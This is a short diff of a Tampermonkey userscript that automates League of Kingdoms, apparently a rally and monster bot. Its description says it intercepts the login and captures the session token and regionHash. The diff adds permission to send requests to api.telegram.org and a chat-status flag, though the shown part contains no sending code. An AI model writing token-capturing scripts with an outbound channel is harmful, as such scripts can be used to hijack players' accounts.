@@ -1,10 +1,11 @@
 // ==UserScript==
-// @name         AutoJoinRallyLOK (Loader Klasik)
+// @name         Rafflesia
 // @namespace    http://tampermonkey.net/
 // @version      1.2
 // @description  Intercept login and capture token + regionHash
 // @match        https://play.leagueofkingdoms.com/*
-// @grant        none
+// @grant        GM_xmlhttpRequest
+// @connect      api.telegram.org
 // @require      https://cdn.jsdelivr.net/npm/pako@2.1.0/dist/pako.min.js
 // ==/UserScript==
 
@@ -12,9 +13,10 @@
     'use strict';
 
     // 💡 Pastikan variabel bisa diakses oleh script eksternal
+    window.sendChatStatus = true;
     window.delayCheckListRally_ = 150000; // 150 detik delay untuk check list rally
     window.troopCodes = [50100306, 50100305, 50100304];
-    window.troopAmounts = [0, 200000, 0];
+    window.troopAmounts = [0, 250000, 0];
     window.allowedMonsters = {
         "20200201": { name: "DeathKar", minLevel: 4 },
         "20200202": { name: "Green Dragon", minLevel: 99 },
